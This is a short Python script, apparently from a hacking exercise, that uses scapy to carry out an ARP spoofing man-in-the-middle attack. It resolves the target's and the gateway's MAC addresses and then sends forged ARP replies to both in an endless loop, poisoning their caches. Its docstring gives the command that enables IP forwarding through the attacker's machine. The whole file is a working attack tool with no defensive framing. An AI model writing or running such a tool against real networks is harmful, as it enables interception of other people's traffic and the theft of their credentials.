#!/usr/bin/env python

"""
| Description:
    Spoofs router and victim MAC address using MITM attack.
| Usage:
    $ python arp_spoofer.py
    $ ./arp_spoofer.py
| Version:
    4
| Notes:
    Enable IP forwarding through attacker machine to enable to
    target_ip to talk to gateway_ip:
        $ echo 1 > /proc/sys/net/ipv4/ip_forward
        
    IndexError: list index out of range when scanning non-existant
    IP addresses.
| Algorithm:
     
| Variables:
    ip
    target_ip
    gateway_ip
    spoof_ip
"""

import scapy.all as scapy
import time
import argparse

def get_arguments():
    '''
    Get arp_spoofer.py arguments passed from user input.
    Returns parser object's stored objects passed from user input.
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Set IP address of target machine")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Set IP address of router gateway")
    args = parser.parse_args()    
    if not args.target_ip:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    if not args.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return args



def get_mac(ip):
    '''
    Creating ARP request packet sent to broadcast frame.
    Returns clients_list containing found IP and MAC addresses.
    '''
    # create ARP packet
    arp_request = scapy.ARP(pdst=ip)

    # create broadcast frame
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # encapsulate ARP packet in broadcast frame
    arp_request_broadcast = broadcast/arp_request

    # srp send/receive/packets with custom mac address
    # srp by default returns 2 list objects, were returning
    # first element of the list by appending  [0]
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # target ip, target mac, router ip
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


#--------------[ MAIN ]--------------

args = get_arguments()

while True:
    spoof(args.target_ip, args.gateway_ip)
    spoof(args.gateway_ip, args.target_ip)
    time.sleep(2)


